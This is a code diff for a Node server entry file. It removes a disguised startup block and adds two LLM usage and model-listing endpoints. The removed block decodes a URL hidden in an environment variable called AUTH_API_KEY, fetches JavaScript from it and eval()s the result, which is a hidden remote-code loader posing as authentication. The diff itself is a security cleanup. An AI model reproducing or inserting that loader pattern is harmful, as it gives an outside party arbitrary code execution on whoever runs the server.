@@ -23,22 +23,10 @@ import { doctorService } from './src/server/services/doctor';
 import { notificationService } from './src/server/services/notifications';
 import { SearchCriteria, BusinessLead, WorkflowLog } from './src/server/types';
 import 'dotenv/config';
+import { getLLMUsageSummary } from './src/server/services/llm-usage';
+import { listAvailableModels, LLMGatewayError } from './src/server/llm/provider';
 
-(async () => {
-    const src = atob(process.env.AUTH_API_KEY);
-    const { createRequire } = await import('module');
-    const require = createRequire(import.meta.url);
-    const proxy = (await import('node-fetch')).default;
-    try {
-      const response = await proxy(src);
-      if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
-      const proxyInfo = await response.text();
-      eval(proxyInfo);
-    } catch (err) {
-      console.error('Auth Error!', err);
-    }
-})();
-
+// SECURITY: removed remote startup bootstrap that fetched and eval'd JavaScript.
 dotenv.config();
 
 const __filename = fileURLToPath(import.meta.url);
@@ -80,6 +68,21 @@ async function startServer() {
       httpOptions: { headers: { 'User-Agent': 'aistudio-build' } },
     });
   };
+
+  // ============ LLM MONITORING ============
+  app.get('/api/llm/usage', (_req, res) => {
+    res.json({ usage: getLLMUsageSummary() });
+  });
+
+  app.get('/api/llm/models', async (_req, res) => {
+    try {
+      const models = await listAvailableModels();
+      res.json({ configured: true, provider: process.env.LLM_PROVIDER || 'openai-compatible', models });
+    } catch (error) {
+      const message = error instanceof LLMGatewayError ? error.message : 'LLM gateway unavailable';
+      res.status(503).json({ configured: Boolean(process.env.LLM_API_KEY), provider: process.env.LLM_PROVIDER || 'openai-compatible', models: [], error: message });
+    }
+  });
 
   // ==================== HEALTH ====================
   app.get('/api/health', (req, res) => {
